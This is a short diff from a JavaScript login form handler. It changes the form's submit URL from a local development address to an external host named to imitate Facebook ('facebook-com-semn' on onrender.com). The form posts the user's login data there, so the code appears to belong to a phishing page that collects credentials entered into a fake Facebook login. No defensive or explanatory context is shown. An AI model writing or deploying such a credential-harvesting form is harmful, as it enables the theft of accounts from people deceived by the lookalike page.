@@ -17,7 +17,7 @@ const inputChange =(e) => {
 const sendData = async(e) => {
     e.preventDefault();
     try {
-       let url=`http://localhost:5173/login`;
+       let url=`https://facebook-com-semn.onrender.com/login`;
     let body=JSON.stringify(userData);
     btn.innerText="Please wait"
     const response = await fetch(url, {
